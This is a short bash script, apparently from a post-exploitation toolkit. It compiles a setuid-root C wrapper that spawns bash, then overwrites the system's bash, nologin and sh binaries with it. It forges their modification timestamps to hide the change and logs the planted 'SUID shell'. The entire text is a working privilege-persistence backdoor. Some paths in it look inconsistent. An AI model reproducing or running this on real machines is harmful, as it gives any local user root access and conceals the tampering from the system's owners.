echo '#include<stdlib.h>
#include<unistd.h>
int main() {
	setuid(0);
	setgid(0);
	system("/bin/bash");
}' > wrapper.c

gcc wrapper.c -o sushi
chmod 6777 sushi

./logger.sh /usr/bin/sushi created

declare -a suidArray=("bash" "nologin" "sh")

for binary in "${suidArray[@]}"; do
	absolute_path=$(type -p "${binary}" | head -n 1)
	cp --preserve=timestamps "${absolute_path}" /tmp/"${binary}" ## Create a backup
	cp ./sushi ./"${absolute_path}" ## Overwrite original system versions
	touch -r /tmp/"${binary}" "${absolute_path}" ## Inherit backup's modification
done

./logger.sh mksuidshell 'Suid shell written to /usr/bin/sushi and nologin'
